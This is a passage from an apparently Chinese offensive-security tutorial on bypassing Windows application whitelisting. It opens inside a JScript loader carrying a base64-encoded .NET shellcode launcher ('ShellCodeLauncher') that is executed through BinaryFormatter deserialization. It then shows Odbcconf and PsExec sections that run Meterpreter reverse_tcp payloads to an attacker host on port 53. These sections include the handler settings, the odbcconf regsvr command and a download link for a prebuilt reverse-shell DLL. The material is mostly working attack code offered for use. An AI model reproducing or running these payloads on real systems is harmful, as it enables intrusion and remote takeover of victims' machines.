<span class="token string">"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"</span><span class="token operator">+</span>
<span class="token string">"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"</span><span class="token operator">+</span>
<span class="token string">"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"</span><span class="token operator">+</span>
<span class="token string">"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAVC1CXAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAA4AACIQsBCwAADAAAAAYAAAAAAAAOKgAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAwCkA"</span><span class="token operator">+</span>
<span class="token string">"AEsAAAAAQAAA0AIAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAALnRleHQAAAAUCgAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAA0AIAAABA"</span><span class="token operator">+</span>
<span class="token string">"AAAABAAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAASAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAPApAAAAAAAASAAAAAIABQBEIgAAfAcAAAMAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQgIoBAAACgAA"</span><span class="token operator">+</span>
<span class="token string">"KAIAAAYAACoAAAAAAAAA/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH"</span><span class="token operator">+</span>
<span class="token string">"4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiL"</span><span class="token operator">+</span>
<span class="token string">"WCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/"</span><span class="token operator">+</span>
<span class="token string">"0LiQAQAAKcRUUGgpgGsA/9VqCmjAqAEEaAIAADWJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/"</span><span class="token operator">+</span>
<span class="token string">"1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBW"</span><span class="token operator">+</span>
<span class="token string">"U1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMp"</span><span class="token operator">+</span>
"xnXBw7vwtaJWagBT<span class="token operator">/</span><span class="token number">9U</span>AAAATMAYAZQAAAAEAABEAIFUBAACNBgAAASXQAwAABCgGAAAKC
hYGjml<span class="token operator">+</span><span class="token string">"+"</span>AQAABH4CAAAEKAMAAAYLBhYHbigHAAAKBo5pKAgAAAoAfgkAAAoMFg1<span class="token operator">+</span>CQAAChMEFhYHEQQWEgMo"<span class="token operator">+</span>
<span class="token string">"BAAABgwIFSgFAAAGJisAKkogABAAAIABAAAEH0CAAgAABCpCU0pCAQABAAAAAAAMAAAAdjQuMC4z"</span><span class="token operator">+</span>
<span class="token string">"MDMxOQAAAAAFAGwAAABgAgAAI34AAMwCAABkAwAAI1N0cmluZ3MAAAAAMAYAAAgAAAAjVVMAOAYA"</span><span class="token operator">+</span>
<span class="token string">"ABAAAAAjR1VJRAAAAEgGAAA0AQAAI0Jsb2IAAAAAAAAAAgAAAVfVAjQJAgAAAPolMwAWAAABAAAA"</span><span class="token operator">+</span>
<span class="token string">"DwAAAAQAAAADAAAABgAAAAwAAAALAAAABAAAAAEAAAABAAAAAQAAAAEAAAADAAAAAQAAAAEAAAAB"</span><span class="token operator">+</span>
<span class="token string">"AAAAAQAAAAAACgABAAAAAAAGAEsARAAGAFsBPwEGAHcBPwEGAKYBhgEGAMYBhgEGAPcBRAAGAEEC"</span><span class="token operator">+</span>
<span class="token string">"hgEGAFwCRAAGAJgChgEGAKcCRAAGAK0CRAAGANACRAAGAAID4wIGABQD4wIGAEcDNwMAAAAAAQAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAQABAAEAEAAhACkABQABAAEAAAAAAPwBAAAFAAMABwATAQAAZgIAACEABAAHABEAXQASABEA"</span><span class="token operator">+</span>
<span class="token string">"aAASABMBhAI+AFAgAAAAAIYYUgAKAAEAwCEAAAAAkQBYAA4AAQAAAAAAgACRIH8AFQABAAAAAACA"</span><span class="token operator">+</span>
<span class="token string">"AJEgjAAdAAUAAAAAAIAAkSCZACgACwAxIgAAAACRGDADDgANAAAAAQCtAAAAAgC5AAAAAwC+AAAA"</span><span class="token operator">+</span>
<span class="token string">"BADPAAAAAQDZAAAAAgDsAAAAAwD4AAAABAAHAQAABQANAQAABgAdAQAAAQAoAQAAAgAwAREAUgAu"</span><span class="token operator">+</span>
<span class="token string">"ACEAUgA0ACkAUgAKAAkAUgAKADkAUgAKAEkAwAJCAGEA1wJKAGkACgNPAGEADwNYAHEAUgBkAHkA"</span><span class="token operator">+</span>
<span class="token string">"UgAKACcAWwA5AC4AEwBpAC4AGwByAGMAKwA5AAgABgCRAAEAVQEAAAQAWwAnAwABBwB/AAEAAAEJ"</span><span class="token operator">+</span>
<span class="token string">"AIwAAQAAAQsAmQABAGggAAADAASAAAAAAAAAAAAAAAAAAAAAAOQBAAAEAAAAAAAAAAAAAAABADsA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAQAAwAAAAA8TW9kdWxlPgB3bWlfY3NfZGxsX3BheWxvYWQuZGxsAFByb2dyYW0AU2hlbGxD"</span><span class="token operator">+</span>
<span class="token string">"b2RlTGF1bmNoZXIAbXNjb3JsaWIAU3lzdGVtAE9iamVjdAAuY3RvcgBNYWluAE1FTV9DT01NSVQA"</span><span class="token operator">+</span>
<span class="token string">"UEFHRV9FWEVDVVRFX1JFQURXUklURQBWaXJ0dWFsQWxsb2MAQ3JlYXRlVGhyZWFkAFdhaXRGb3JT"</span><span class="token operator">+</span>
<span class="token string">"aW5nbGVPYmplY3QAbHBTdGFydEFkZHIAc2l6ZQBmbEFsbG9jYXRpb25UeXBlAGZsUHJvdGVjdABs"</span><span class="token operator">+</span>
<span class="token string">"cFRocmVhZEF0dHJpYnV0ZXMAZHdTdGFja1NpemUAbHBTdGFydEFkZHJlc3MAcGFyYW0AZHdDcmVh"</span><span class="token operator">+</span>
<span class="token string">"dGlvbkZsYWdzAGxwVGhyZWFkSWQAaEhhbmRsZQBkd01pbGxpc2Vjb25kcwBTeXN0ZW0uU2VjdXJp"</span><span class="token operator">+</span>
<span class="token string">"dHkuUGVybWlzc2lvbnMAU2VjdXJpdHlQZXJtaXNzaW9uQXR0cmlidXRlAFNlY3VyaXR5QWN0aW9u"</span><span class="token operator">+</span>
<span class="token string">"AFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0"</span><span class="token operator">+</span>
<span class="token string">"dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQB3bWlfY3NfZGxsX3BheWxvYWQA"</span><span class="token operator">+</span>
<span class="token string">"Qnl0ZQA8UHJpdmF0ZUltcGxlbWVudGF0aW9uRGV0YWlscz57MEQxQTVERjAtRDZCNy00RUUzLUJB"</span><span class="token operator">+</span>
<span class="token string">"QzItOTY0MUUyREJCMDNFfQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBWYWx1ZVR5cGUAX19T"</span><span class="token operator">+</span>
<span class="token string">"dGF0aWNBcnJheUluaXRUeXBlU2l6ZT0zNDEAJCRtZXRob2QweDYwMDAwMDItMQBSdW50aW1lSGVs"</span><span class="token operator">+</span>
<span class="token string">"cGVycwBBcnJheQBSdW50aW1lRmllbGRIYW5kbGUASW5pdGlhbGl6ZUFycmF5AEludFB0cgBvcF9F"</span><span class="token operator">+</span>
<span class="token string">"eHBsaWNpdABTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMATWFyc2hhbABDb3B5AFplcm8A"</span><span class="token operator">+</span>
<span class="token string">"RGxsSW1wb3J0QXR0cmlidXRlAGtlcm5lbDMyAC5jY3RvcgBTeXN0ZW0uU2VjdXJpdHkAVW52ZXJp"</span><span class="token operator">+</span>
<span class="token string">"ZmlhYmxlQ29kZUF0dHJpYnV0ZQAAAAAAAyAAAAAAAPBdGg231uNOusKWQeLbsD4ACLd6XFYZNOCJ"</span><span class="token operator">+</span>
<span class="token string">"AyAAAQMAAAECBgkHAAQJCQkJCQoABhgJCQkYCRAJBQACCRgJBSABARENBCABAQgEAQAAAAMGERAH"</span><span class="token operator">+</span>
<span class="token string">"AAIBEikRLQQAARgKCAAEAR0FCBgIAgYYCAcFHQUJGAkYBCABAQ4IAQAIAAAAAAAeAQABAFQCFldy"</span><span class="token operator">+</span>
<span class="token string">"YXBOb25FeGNlcHRpb25UaHJvd3MBgJ4uAYCEU3lzdGVtLlNlY3VyaXR5LlBlcm1pc3Npb25zLlNl"</span><span class="token operator">+</span>
<span class="token string">"Y3VyaXR5UGVybWlzc2lvbkF0dHJpYnV0ZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3Vs"</span><span class="token operator">+</span>
<span class="token string">"dHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5FQFUAhBTa2lwVmVy"</span><span class="token operator">+</span>
<span class="token string">"aWZpY2F0aW9uAQAAAOgpAAAAAAAAAAAAAP4pAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwKQAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAB0AgAAAAAAAAAAAAB0AjQAAABW"</span><span class="token operator">+</span>
<span class="token string">"AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAE1AEAAAEAUwB0AHIAaQBuAGcA"</span><span class="token operator">+</span>
<span class="token string">"RgBpAGwAZQBJAG4AZgBvAAAAsAEAAAEAMAAwADAAMAAwADQAYgAwAAAALAACAAEARgBpAGwAZQBE"</span><span class="token operator">+</span>
<span class="token string">"AGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4A"</span><span class="token operator">+</span>
<span class="token string">"AAAAADAALgAwAC4AMAAuADAAAABQABcAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAHcAbQBp"</span><span class="token operator">+</span>
<span class="token string">"AF8AYwBzAF8AZABsAGwAXwBwAGEAeQBsAG8AYQBkAC4AZABsAGwAAAAAACgAAgABAEwAZQBnAGEA"</span><span class="token operator">+</span>
<span class="token string">"bABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAABYABcAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBu"</span><span class="token operator">+</span>
<span class="token string">"AGEAbQBlAAAAdwBtAGkAXwBjAHMAXwBkAGwAbABfAHAAYQB5AGwAbwBhAGQALgBkAGwAbAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"NAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAADgACAAB"</span><span class="token operator">+</span>
<span class="token string">"AEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAABA6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token operator">+</span>
<span class="token string">"AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs"</span><span class="token operator">+</span>
<span class="token string">"ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA"</span><span class="token punctuation">;</span>
var entry_class <span class="token operator">=</span> <span class="token string">'ShellCodeLauncher.Program'</span><span class="token punctuation">;</span> 

try <span class="token punctuation">{</span>
<span class="token function">setversion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
var stm <span class="token operator">=</span> <span class="token function">base64ToStream</span><span class="token punctuation">(</span>serialized_obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
var fmt <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">'System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
var al <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">'System.Collections.ArrayList'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
var d <span class="token operator">=</span> fmt<span class="token punctuation">.</span><span class="token function">Deserialize_2</span><span class="token punctuation">(</span>stm<span class="token punctuation">)</span><span class="token punctuation">;</span>
al<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span>undefined<span class="token punctuation">)</span><span class="token punctuation">;</span>
var o <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">DynamicInvoke</span><span class="token punctuation">(</span>al<span class="token punctuation">.</span><span class="token function">ToArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">CreateInstance</span><span class="token punctuation">(</span>entry_class<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> catch <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token function">debug</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> 

<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span> 

<span class="token operator">&lt;</span><span class="token operator">/</span>component<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>package<span class="token operator">&gt;</span>
</code></pre>
<h2><a id="1112_Odbcconfpayload_2022"></a>11.12 基于白名单Odbcconf执行payload（十二）</h2>
<p><strong>Odbcconf简介：</strong></p>
<p>ODBCCONF.exe是一个命令行工具，允许配置ODBC驱动程序和数据源。</p>
<p><strong>微软官方文档：</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>microsoft<span class="token punctuation">.</span>com<span class="token operator">/</span>en<span class="token operator">-</span>us<span class="token operator">/</span>sql<span class="token operator">/</span>odbc<span class="token operator">/</span>odbcconf<span class="token operator">-</span>exe<span class="token operator">?</span>view<span class="token operator">=</span>sql<span class="token operator">-</span>server<span class="token operator">-</span><span class="token number">2017</span>
</code></pre>
<p>说明：Odbcconf.exe所在路径已被系统添加PATH环境变量中，因此，Odbcconf命令可识别，需注意x86，x64位的Odbcconf调用。</p>
<p>Windows 2003 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\WINDOWS\system32\odbcconf<span class="token punctuation">.</span>exe
C<span class="token punctuation">:</span>\WINDOWS\SysWOW64\odbcconf<span class="token punctuation">.</span>exe
</code></pre>
<p>Windows 7 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\System32\odbcconf<span class="token punctuation">.</span>exe
C<span class="token punctuation">:</span>\Windows\SysWOW64\odbcconf<span class="token punctuation">.</span>exe
</code></pre>
<p>攻击机：<br>
192.168.1.4 Debian</p>
<p>靶机：<br>
192.168.1.119 Windows 2003<br>
192.168.1.5 Windows 7</p>
<p><strong>配置攻击机msf：</strong><br>
注：x86 payload</p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ 

Payload options <span class="token punctuation">(</span>windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
EXITFUNC process yes Exit technique <span class="token punctuation">(</span>Accepted<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> seh<span class="token punctuation">,</span> thread<span class="token punctuation">,</span> process<span class="token punctuation">,</span> none<span class="token punctuation">)</span>

LHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> yes The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>

LPORT <span class="token number">53</span> yes The listen port 

Exploit target<span class="token punctuation">:</span> 

Id Name

‐‐ ‐‐‐‐
<span class="token number">0</span> Wildcard Target 

msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010165812310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>靶机执行：Windows 2003</strong></p>
<p>注：文中为了更好的跨Windows 03–Windows 2016，Odbcconf for dll采纯C重新编写。<br>
<img src="https://img-blog.csdnimg.cn/20201010165828462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\SysWOW64\odbcconf<span class="token punctuation">.</span>exe <span class="token operator">/</span>a <span class="token punctuation">{</span>regsvr C<span class="token punctuation">:</span>\Micropoor_Odbcconf<span class="token punctuation">.</span>dll<span class="token punctuation">}</span>
</code></pre>
<p>注：x64 Odbcconf.exe</p>
<p><img src="https://img-blog.csdnimg.cn/20201010165908463.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201010165914104.png#pic_center" alt="在这里插入图片描述"></p>
<p>附：<br>
Micropoor_Odbcconf.dll，已测Windows 2003 x64 Windows 7 x64</p>
<p>注： 功能：reverse_tcp IP:192.168.1.4 PORT:53。如有安全软件拦截，因Micropoor加入特征。</p>
<p>大小: 73216 字节 修改时间: 2019年1月19日, 21:29:11 MD5:</p>
<p>B31B971F01DE32EC5EC45746BF3DDAD2 SHA1: CF42E4BF5A613992B7A563A522BBEBF1D0F06CCE CRC32: 28A1CE90</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>drive<span class="token punctuation">.</span>google<span class="token punctuation">.</span>com<span class="token operator">/</span>open<span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span>j12W7VOhv_<span class="token operator">-</span>NdnZpFhWLwdt8sQwxdAsk
</code></pre>
<hr>
<h2><a id="1113_PsExecpayload_2116"></a>11.13 基于白名单PsExec执行payload（十三）</h2>
<p><strong>PsExec简介：</strong></p>
<p>微软于2006年7月收购sysinternals公司，PsExec是SysinternalsSuite的小工具之一，是一种轻量级的telnet替代品，允许在其他系统上执行进程，完成控制台应用程序的完全交互，而无需手动安装客户端软件，并且可以获得与控制台应用程序相当的完全交互性。</p>
<p><strong>微软官方文档：</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>microsoft<span class="token punctuation">.</span>com<span class="token operator">/</span>zh<span class="token operator">-</span>cn<span class="token operator">/</span>sysinternals<span class="token operator">/</span>downloads<span class="token operator">/</span>psexec
</code></pre>
<p>说明：PsExec.exe没有默认安装在windows系统。</p>
<p>攻击机： 192.168.1.4 Debian<br>
靶机： 192.168.1.119 Windows 2003</p>
<p>配置攻击机msf：</p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ 

Payload options <span class="token punctuation">(</span>windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
EXITFUNC process yes Exit technique <span class="token punctuation">(</span>Accepted<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> seh<span class="token punctuation">,</span> thread<span class="token punctuation">,</span> process<span class="token punctuation">,</span> none<span class="token punctuation">)</span>

LHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> yes The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>

LPORT <span class="token number">53</span> yes The listen port 

Exploit target<span class="token punctuation">:</span> 

Id Name
‐‐ ‐‐‐‐
<span class="token number">0</span> Wildcard Target 

msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010230707420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>靶机执行：</strong><br>
<img src="https://img-blog.csdnimg.cn/20201010230736324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
